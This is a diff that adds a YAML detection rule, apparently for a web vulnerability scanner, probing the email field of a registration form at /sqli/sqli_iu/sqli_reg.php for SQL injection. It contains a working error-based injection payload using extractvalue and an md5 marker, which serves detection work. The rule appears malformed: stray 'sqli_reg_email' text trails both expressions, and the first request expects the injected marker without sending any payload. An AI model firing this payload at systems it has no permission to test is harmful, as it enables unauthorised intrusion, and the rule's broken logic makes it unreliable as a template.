@@ -1,0 +1,16 @@
+name: sqli_reg_email
+rules:
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin&password=admin&phonenum=admin&sex=JFbTALkdna&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~f00eca802021bf22873d4ad3ec9d194') sqli_reg_email
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281050481514%29%29%29and%27&password=admin&phonenum=admin&sex=JFbTALkdna&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~f00eca802021bf22873d4ad3ec9d194') sqli_reg_email
+detail:
+  type: sqldet
+  paramkey: email
+  payload: admin'and/**/extractvalue(1,concat(char(126),md5(1050481514)))and'
